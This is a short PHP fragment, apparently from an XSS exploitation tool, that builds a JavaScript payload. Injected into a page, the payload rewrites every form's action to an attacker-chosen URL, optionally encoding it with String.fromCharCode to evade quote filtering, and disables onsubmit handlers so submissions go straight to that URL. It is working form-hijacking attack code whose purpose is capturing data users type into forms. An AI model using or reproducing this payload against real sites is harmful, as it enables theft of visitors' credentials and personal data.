<?php
$result  = "<script>";
  $result .= "var f=document.forms;";
  $result .= "var i=f.length-1;";
  // Are you using do!!?? Yes, I'm :) In urls is not recomend
  // the use of + because it's transformed into a space.
  // And, I don't know why, reverse for doesn't works :S
  $result .= "do{";   
    $result .= "f[i].action=";
    if(isset($quotes))
    {
      $result .= "String.fromCharCode(" . toCharArray($submitURL) . ")";
    }
    else
    {
      $result .= "\"".$submitURL."\"";
    }
  $result .= ";f[i].onsubmit=null;"; // We disable any kind of onsubmit() events, we trust in the user :)
  $result .= "}while(--i);";
$result .= "</script>";
?>
